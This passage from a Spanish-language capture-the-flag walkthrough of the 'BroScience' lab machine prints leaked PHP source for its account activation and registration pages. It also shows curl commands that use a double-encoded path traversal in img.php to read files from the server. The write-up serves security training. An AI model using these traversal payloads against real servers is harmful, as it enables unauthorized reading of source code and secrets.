+<span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isset</span><span class="mtk1">($_SESSION[</span><span class="mtk4">'id'</span><span class="mtk1">])) {</span>
+<span class="mtk1">    </span><span class="mtk7">header</span><span class="mtk1">(</span><span class="mtk4">'Location: /index.php'</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isset</span><span class="mtk1">($_GET[</span><span class="mtk4">'code'</span><span class="mtk1">])) {</span>
+<span class="mtk1">    </span><span class="mtk3">// Check if code is formatted correctly (regex)</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">preg_match</span><span class="mtk1">(</span><span class="mtk4">'/</span><span class="mtk5">^</span><span class="mtk4">[A-z0-9]{32}</span><span class="mtk5">$</span><span class="mtk4">/'</span><span class="mtk1">, $_GET[</span><span class="mtk4">'code'</span><span class="mtk1">])) {</span>
+<span class="mtk1">        </span><span class="mtk3">// Check for code in database</span>
+<span class="mtk1">        </span><span class="mtk5">include_once</span><span class="mtk1"> </span><span class="mtk4">'includes/db_connect.php'</span><span class="mtk1">;</span>
+
+<span class="mtk1">        $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_prepare</span><span class="mtk1">($db_conn, </span><span class="mtk4">"check_code_query"</span><span class="mtk1">, </span><span class="mtk4">'</span><span class="mtk5">SELECT</span><span class="mtk4"> id, is_activated::</span><span class="mtk7 mtki">int</span><span class="mtk4"> </span><span class="mtk5">FROM</span><span class="mtk4"> users </span><span class="mtk5">WHERE</span><span class="mtk4"> activation_code</span><span class="mtk5">=</span><span class="mtk4">$</span><span class="mtk6">1</span><span class="mtk4">'</span><span class="mtk1">);</span>
+<span class="mtk1">        $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_execute</span><span class="mtk1">($db_conn, </span><span class="mtk4">"check_code_query"</span><span class="mtk1">, </span><span class="mtk7">array</span><span class="mtk1">($_GET[</span><span class="mtk4">'code'</span><span class="mtk1">]));</span>
+
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">pg_num_rows</span><span class="mtk1">($res) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">) {</span>
+<span class="mtk1">            </span><span class="mtk3">// Check if account already activated</span>
+<span class="mtk1">            $row </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_fetch_row</span><span class="mtk1">($res);</span>
+<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk1">(</span><span class="mtk7 mtki">bool</span><span class="mtk1">)$row[</span><span class="mtk6">1</span><span class="mtk1">]) {</span>
+<span class="mtk1">                </span><span class="mtk3">// Activate account</span>
+<span class="mtk1">                $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_prepare</span><span class="mtk1">($db_conn, </span><span class="mtk4">"activate_account_query"</span><span class="mtk1">, </span><span class="mtk4">'</span><span class="mtk5">UPDATE</span><span class="mtk4"> users </span><span class="mtk5">SET</span><span class="mtk4"> is_activated</span><span class="mtk5">=</span><span class="mtk4">TRUE </span><span class="mtk5">WHERE</span><span class="mtk4"> id</span><span class="mtk5">=</span><span class="mtk4">$</span><span class="mtk6">1</span><span class="mtk4">'</span><span class="mtk1">);</span>
+<span class="mtk1">                $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_execute</span><span class="mtk1">($db_conn, </span><span class="mtk4">"activate_account_query"</span><span class="mtk1">, </span><span class="mtk7">array</span><span class="mtk1">($row[</span><span class="mtk6">0</span><span class="mtk1">]));</span>
+
+<span class="mtk1">                $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Account activated!"</span><span class="mtk1">;</span>
+<span class="mtk1">                $alert_type </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"success"</span><span class="mtk1">;</span>
+<span class="mtk1">            } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">                $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'Account already activated.'</span><span class="mtk1">;</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">            $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Invalid activation code."</span><span class="mtk1">;</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">        $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Invalid activation code."</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">} </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">    $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Missing activation code."</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+<span class="mtk5">?</span><span class="mtk5">&gt;</span>
+
+<span class="mtk1">&lt;</span><span class="mtk5">html</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">head</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        &lt;</span><span class="mtk5">title</span><span class="mtk1">&gt;BroScience : Activate account&lt;/</span><span class="mtk5">title</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        </span><span class="mtk5">&lt;?php</span><span class="mtk1"> </span><span class="mtk5">include_once</span><span class="mtk1"> </span><span class="mtk4">'includes/header.php'</span><span class="mtk1">; </span><span class="mtk5">?</span><span class="mtk5">&gt;</span>
+<span class="mtk1">    &lt;/</span><span class="mtk5">head</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">body</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        </span><span class="mtk5">&lt;?php</span><span class="mtk1"> </span><span class="mtk5">include_once</span><span class="mtk1"> </span><span class="mtk4">'includes/navbar.php'</span><span class="mtk1">; </span><span class="mtk5">?</span><span class="mtk5">&gt;</span>
+<span class="mtk1">        &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-container uk-container-xsmall"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">            </span><span class="mtk5">&lt;?php</span>
+<span class="mtk1">            </span><span class="mtk3">// Display any alerts</span>
+<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isset</span><span class="mtk1">($alert)) {</span>
+<span class="mtk1">            </span><span class="mtk5">?</span><span class="mtk5">&gt;</span>
+<span class="mtk1">                &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">uk-alert</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-alert-</span><span class="mtk5">&lt;?php</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">isset</span><span class="mtk1">($alert_type)){</span><span class="mtk7">echo</span><span class="mtk1"> $alert_type;}</span><span class="mtk5">else</span><span class="mtk1">{</span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">'danger'</span><span class="mtk1">;} </span><span class="mtk5">?</span><span class="mtk5">&gt;</span><span class="mtk4">"</span><span class="mtk1">&gt;</span>  
+<span class="mtk1">                    &lt;</span><span class="mtk5">a</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-alert-close"</span><span class="mtk1"> </span><span class="mtk8">uk-close</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">a</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    </span><span class="mtk5">&lt;?=</span><span class="mtk1">$alert</span><span class="mtk5">?</span><span class="mtk5">&gt;</span>
+<span class="mtk1">                &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+<span class="mtk1">            </span><span class="mtk5">&lt;?php</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">            </span><span class="mtk5">?</span><span class="mtk5">&gt;</span>
+<span class="mtk1">        &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;/</span><span class="mtk5">body</span><span class="mtk1">&gt;</span>
+<span class="mtk1">&lt;/</span><span class="mtk5">html</span><span class="mtk1">&gt;</span>
+</code></pre></div><h3 id="activando-la-cuenta">Activando la cuenta</h3><p>Parece que necesitamos usar un parámetro llamado <code>code</code> y agregar un código que coincida con la RegEx <code>/^[A-Z0-9]{32}$/</code> y con el código guardado en la base de datos. Si miramos <code>register.php</code> podemos ver cómo se genera este código:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k <span class="code-dark-yellow">'https://broscience.htb/includes/img.php?path=%252e%252e/register.php'</span>  
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">&lt;?php</span>
+<span class="mtk7">session_start</span><span class="mtk1">();</span>
+
+<span class="mtk3">// Check if user is logged in already</span>
+<span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isset</span><span class="mtk1">($_SESSION[</span><span class="mtk4">'id'</span><span class="mtk1">])) {</span>
+<span class="mtk1">    </span><span class="mtk7">header</span><span class="mtk1">(</span><span class="mtk4">'Location: /index.php'</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+
+<span class="mtk3">// Handle a submitted register form</span>
+<span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isset</span><span class="mtk1">($_POST[</span><span class="mtk4">'username'</span><span class="mtk1">]) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk7">isset</span><span class="mtk1">($_POST[</span><span class="mtk4">'email'</span><span class="mtk1">]) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk7">isset</span><span class="mtk1">($_POST[</span><span class="mtk4">'password'</span><span class="mtk1">]) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk7">isset</span><span class="mtk1">($_POST[</span><span class="mtk4">'password-confirm'</span><span class="mtk1">])) {</span>
+<span class="mtk1">    </span><span class="mtk3">// Check if variables are empty</span>
+<span class="mtk1">    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk5">!</span><span class="mtk7">empty</span><span class="mtk1">($_POST[</span><span class="mtk4">'username'</span><span class="mtk1">]) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk7">empty</span><span class="mtk1">($_POST[</span><span class="mtk4">'email'</span><span class="mtk1">]) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk7">empty</span><span class="mtk1">($_POST[</span><span class="mtk4">'password'</span><span class="mtk1">]) </span><span class="mtk5">&amp;&amp;</span><span class="mtk1"> </span><span class="mtk5">!</span><span class="mtk7">empty</span><span class="mtk1">($_POST[</span><span class="mtk4">'password-confirm'</span><span class="mtk1">])) {</span>
+<span class="mtk1">        </span><span class="mtk3">// Check if passwords match</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">strcmp</span><span class="mtk1">($_POST[</span><span class="mtk4">'password'</span><span class="mtk1">], $_POST[</span><span class="mtk4">'password-confirm'</span><span class="mtk1">]) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">            </span><span class="mtk3">// Check if email is too long</span>
+<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">strlen</span><span class="mtk1">($_POST[</span><span class="mtk4">'email'</span><span class="mtk1">]) </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk6">100</span><span class="mtk1">) {</span>
+<span class="mtk1">                </span><span class="mtk3">// Check if email is valid</span>
+<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">filter_var</span><span class="mtk1">($_POST[</span><span class="mtk4">'email'</span><span class="mtk1">], </span><span class="mtk7">FILTER_VALIDATE_EMAIL</span><span class="mtk1">)) {</span>
+<span class="mtk1">                    </span><span class="mtk3">// Check if username is valid</span>
+<span class="mtk1">                    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">strlen</span><span class="mtk1">($_POST[</span><span class="mtk4">'username'</span><span class="mtk1">]) </span><span class="mtk5">&lt;=</span><span class="mtk1"> </span><span class="mtk6">100</span><span class="mtk1">) {</span>
+<span class="mtk1">                        </span><span class="mtk3">// Check if user exists already</span>
+<span class="mtk1">                        </span><span class="mtk5">include_once</span><span class="mtk1"> </span><span class="mtk4">'includes/db_connect.php'</span><span class="mtk1">;</span>
+
+<span class="mtk1">                        $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_prepare</span><span class="mtk1">($db_conn, </span><span class="mtk4">"check_username_query"</span><span class="mtk1">, </span><span class="mtk4">'</span><span class="mtk5">SELECT</span><span class="mtk4"> id </span><span class="mtk5">FROM</span><span class="mtk4"> users </span><span class="mtk5">WHERE</span><span class="mtk4"> username </span><span class="mtk5">=</span><span class="mtk4"> $</span><span class="mtk6">1</span><span class="mtk4">'</span><span class="mtk1">);</span>
+<span class="mtk1">                        $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_execute</span><span class="mtk1">($db_conn, </span><span class="mtk4">"check_username_query"</span><span class="mtk1">, </span><span class="mtk7">array</span><span class="mtk1">($_POST[</span><span class="mtk4">'username'</span><span class="mtk1">]));</span>
+
+<span class="mtk1">                        </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">pg_num_rows</span><span class="mtk1">($res) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">                            </span><span class="mtk3">// Check if email is registered already</span>
+<span class="mtk1">                            $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_prepare</span><span class="mtk1">($db_conn, </span><span class="mtk4">"check_email_query"</span><span class="mtk1">, </span><span class="mtk4">'</span><span class="mtk5">SELECT</span><span class="mtk4"> id </span><span class="mtk5">FROM</span><span class="mtk4"> users </span><span class="mtk5">WHERE</span><span class="mtk4"> email </span><span class="mtk5">=</span><span class="mtk4"> $</span><span class="mtk6">1</span><span class="mtk4">'</span><span class="mtk1">);</span>
+<span class="mtk1">                            $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_execute</span><span class="mtk1">($db_conn, </span><span class="mtk4">"check_email_query"</span><span class="mtk1">, </span><span class="mtk7">array</span><span class="mtk1">($_POST[</span><span class="mtk4">'email'</span><span class="mtk1">]));</span>
+
+<span class="mtk1">                            </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">pg_num_rows</span><span class="mtk1">($res) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">                                </span><span class="mtk3">// Create the account</span>
+<span class="mtk1">                                </span><span class="mtk5">include_once</span><span class="mtk1"> </span><span class="mtk4">'includes/utils.php'</span><span class="mtk1">;</span>
+<span class="mtk1">                                $activation_code </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">generate_activation_code</span><span class="mtk1">();</span>
+<span class="mtk1">                                $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_prepare</span><span class="mtk1">($db_conn, </span><span class="mtk4">"check_code_unique_query"</span><span class="mtk1">, </span><span class="mtk4">'</span><span class="mtk5">SELECT</span><span class="mtk4"> id </span><span class="mtk5">FROM</span><span class="mtk4"> users </span><span class="mtk5">WHERE</span><span class="mtk4"> activation_code </span><span class="mtk5">=</span><span class="mtk4"> $</span><span class="mtk6">1</span><span class="mtk4">'</span><span class="mtk1">);</span>
+<span class="mtk1">                                $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_execute</span><span class="mtk1">($db_conn, </span><span class="mtk4">"check_code_unique_query"</span><span class="mtk1">, </span><span class="mtk7">array</span><span class="mtk1">($activation_code));</span>
+
+<span class="mtk1">                                </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">pg_num_rows</span><span class="mtk1">($res) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">) {</span>
+<span class="mtk1">                                    $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_prepare</span><span class="mtk1">($db_conn, </span><span class="mtk4">"create_user_query"</span><span class="mtk1">, </span><span class="mtk4">'</span><span class="mtk5">INSERT INTO</span><span class="mtk4"> users (username, </span><span class="mtk5">password</span><span class="mtk4">, email, activation_code) </span><span class="mtk5">VALUES</span><span class="mtk4"> ($</span><span class="mtk6">1</span><span class="mtk4">, $</span><span class="mtk6">2</span><span class="mtk4">, $</span><span class="mtk6">3</span><span class="mtk4">, $</span><span class="mtk6">4</span><span class="mtk4">)</span><span class="mtk4">'</span><span class="mtk1">);</span>
+<span class="mtk1">                                    $res </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk7">pg_execute</span><span class="mtk1">($db_conn, </span><span class="mtk4">"create_user_query"</span><span class="mtk1">, </span><span class="mtk7">array</span><span class="mtk1">($_POST[</span><span class="mtk4">'username'</span><span class="mtk1">], </span><span class="mtk7">md5</span><span class="mtk1">($db_salt </span><span class="mtk5">.</span><span class="mtk1"> $_POST[</span><span class="mtk4">'password'</span><span class="mtk1">]), $_POST[</span><span class="mtk4">'email'</span><span class="mtk1">], $activation_code));</span>  
+
+<span class="mtk1">                                    </span><span class="mtk3">// TODO: Send the activation link to email</span>
+<span class="mtk1">                                    $activation_li</span><span class="mtk1">nk </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"</span><span class="mtk4 detected-link">https://broscience.htb/activate.php?code={</span><span class="mtk1 detected-link">$activation_code</span><span class="mtk4 detected-link">}</span><span class="mtk4">"</span><span class="mtk1">;</span>
+
+<span class="mtk1">                                    $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Account created. Please check your email for the </span><span class="mtk4">activation link."</span><span class="mtk1">;</span>
+<span class="mtk1">                                    $alert_type </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"success"</span><span class="mtk1">;</span>
+<span class="mtk1">                                } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">                                    $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Failed to generate a valid activation code, pleas</span><span class="mtk4">e try again."</span><span class="mtk1">;</span>
+<span class="mtk1">                                }</span>
+<span class="mtk1">                            } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">                                $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"An account with this email already exists."</span><span class="mtk1">;</span>
+<span class="mtk1">                            }</span>
+<span class="mtk1">                        }</span>
+<span class="mtk1">                        </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">                            $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Username is already taken."</span><span class="mtk1">;</span>
+<span class="mtk1">                        }</span>
+<span class="mtk1">                    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">                        $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Maximum username length is 100 characters."</span><span class="mtk1">;</span>
+<span class="mtk1">                    }</span>
+<span class="mtk1">                } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">                    $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Please enter a valid email address."</span><span class="mtk1">;</span>
+<span class="mtk1">                }</span>
+<span class="mtk1">            } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">                $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Maximum email length is 100 characters."</span><span class="mtk1">;</span>
+<span class="mtk1">            }</span>
+<span class="mtk1">        } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">            $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Passwords do not match."</span><span class="mtk1">;</span>
+<span class="mtk1">        }</span>
+<span class="mtk1">    } </span><span class="mtk5">else</span><span class="mtk1"> {</span>
+<span class="mtk1">        $alert </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Please fill all fields in."</span><span class="mtk1">;</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">}</span>
+<span class="mtk5">?</span><span class="mtk5">&gt;</span>
+
+<span class="mtk1">&lt;</span><span class="mtk5">html</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">head</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        &lt;</span><span class="mtk5">title</span><span class="mtk1">&gt;BroScience : Register&lt;/</span><span class="mtk5">title</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        </span><span class="mtk5">&lt;?php</span><span class="mtk1"> </span><span class="mtk5">include_once</span><span class="mtk1"> </span><span class="mtk4">'includes/header.php'</span><span class="mtk1">; </span><span class="mtk5">?</span><span class="mtk5">&gt;</span>
+<span class="mtk1">    &lt;/</span><span class="mtk5">head</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;</span><span class="mtk5">body</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        </span><span class="mtk5">&lt;?php</span><span class="mtk1"> </span><span class="mtk5">include_once</span><span class="mtk1"> </span><span class="mtk4">'includes/navbar.php'</span><span class="mtk1">; </span><span class="mtk5">?</span><span class="mtk5">&gt;</span>
+<span class="mtk1">        &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-container uk-container-xsmall"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">            &lt;</span><span class="mtk5">form</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-form-stacked"</span><span class="mtk1"> </span><span class="mtk8">method</span><span class="mtk1">=</span><span class="mtk4">"POST"</span><span class="mtk1"> </span><span class="mtk8">action</span><span class="mtk1">=</span><span class="mtk4">"register.php"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                &lt;</span><span class="mtk5">fieldset</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-fieldset"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    &lt;</span><span class="mtk5">legend</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-legend"</span><span class="mtk1">&gt;Register&lt;/</span><span class="mtk5">legend</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    </span><span class="mtk5">&lt;?php</span>
+<span class="mtk1">                    </span><span class="mtk3">// Display any alerts</span>
+<span class="mtk1">                    </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk7">isset</span><span class="mtk1">($alert)) {</span>
+<span class="mtk1">                    </span><span class="mtk5">?</span><span class="mtk5">&gt;</span>
+<span class="mtk1">                    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">uk-alert</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-alert-</span><span class="mtk5">&lt;?php</span><span class="mtk1"> </span><span class="mtk5">if</span><span class="mtk1">(</span><span class="mtk7">isset</span><span class="mtk1">($alert_type)){</span><span class="mtk7">echo</span><span class="mtk1"> $alert_type;}</span><span class="mtk5">else</span><span class="mtk1">{</span><span class="mtk7">echo</span><span class="mtk1"> </span><span class="mtk4">'danger'</span><span class="mtk1">;} </span><span class="mtk5">?</span><span class="mtk5">&gt;</span><span class="mtk4">"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                            &lt;</span><span class="mtk5">a</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-alert-close"</span><span class="mtk1"> </span><span class="mtk8">uk-close</span><span class="mtk1">&gt;&lt;/</span><span class="mtk5">a</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                            </span><span class="mtk5">&lt;?=</span><span class="mtk1">$alert</span><span class="mtk5">?</span><span class="mtk5">&gt;</span>
+<span class="mtk1">                        &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    </span><span class="mtk5">&lt;?php</span>
+<span class="mtk1">                    }</span>
+<span class="mtk1">                    </span><span class="mtk5">?</span><span class="mtk5">&gt;</span>
+<span class="mtk1">                    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-margin"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                        &lt;</span><span class="mtk5">input</span><span class="mtk1"> </span><span class="mtk8">name</span><span class="mtk1">=</span><span class="mtk4">"username"</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-input"</span><span class="mtk1"> </span><span class="mtk8">placeholder</span><span class="mtk1">=</span><span class="mtk4">"Username"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-margin"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                        &lt;</span><span class="mtk5">input</span><span class="mtk1"> </span><span class="mtk8">name</span><span class="mtk1">=</span><span class="mtk4">"email"</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-input"</span><span class="mtk1"> </span><span class="mtk8">type</span><span class="mtk1">=</span><span class="mtk4">"email"</span><span class="mtk1"> </span><span class="mtk8">placeholder</span><span class="mtk1">=</span><span class="mtk4">"Email"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-margin"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                        &lt;</span><span class="mtk5">input</span><span class="mtk1"> </span><span class="mtk8">name</span><span class="mtk1">=</span><span class="mtk4">"password"</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-input"</span><span class="mtk1"> </span><span class="mtk8">type</span><span class="mtk1">=</span><span class="mtk4">"password"</span><span class="mtk1"> </span><span class="mtk8">placeholder</span><span class="mtk1">=</span><span class="mtk4">"Password"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-margin"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                        &lt;</span><span class="mtk5">input</span><span class="mtk1"> </span><span class="mtk8">name</span><span class="mtk1">=</span><span class="mtk4">"password-confirm"</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-input"</span><span class="mtk1"> </span><span class="mtk8">type</span><span class="mtk1">=</span><span class="mtk4">"password"</span><span class="mtk1"> </span><span class="mtk8">placeholder</span><span class="mtk1">=</span><span class="mtk4">"Repeat password"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    &lt;</span><span class="mtk5">div</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-margin"</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                        &lt;</span><span class="mtk5">button</span><span class="mtk1"> </span><span class="mtk8">class</span><span class="mtk1">=</span><span class="mtk4">"uk-button uk-button-default"</span><span class="mtk1"> </span><span class="mtk8">type</span><span class="mtk1">=</span><span class="mtk4">"submit"</span><span class="mtk1">&gt;Register&lt;/</span><span class="mtk5">button</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                    &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+<span class="mtk1">                &lt;/</span><span class="mtk5">fieldset</span><span class="mtk1">&gt;</span>
+<span class="mtk1">            &lt;/</span><span class="mtk5">form</span><span class="mtk1">&gt;</span>
+<span class="mtk1">        &lt;/</span><span class="mtk5">div</span><span class="mtk1">&gt;</span>
+<span class="mtk1">    &lt;/</span><span class="mtk5">body</span><span class="mtk1">&gt;</span>
+<span class="mtk1">&lt;/</span><span class="mtk5">html</span><span class="mtk1">&gt;</span>
+</code></pre></div><p>Está llamando a <code>generate_activation_code</code>, que es una función definida en <code>includes/utils.php</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> -k <span class="code-dark-yellow">'https://broscience.htb/includes/img.php?path=%252e%252e/includes/utils.php'</span>  
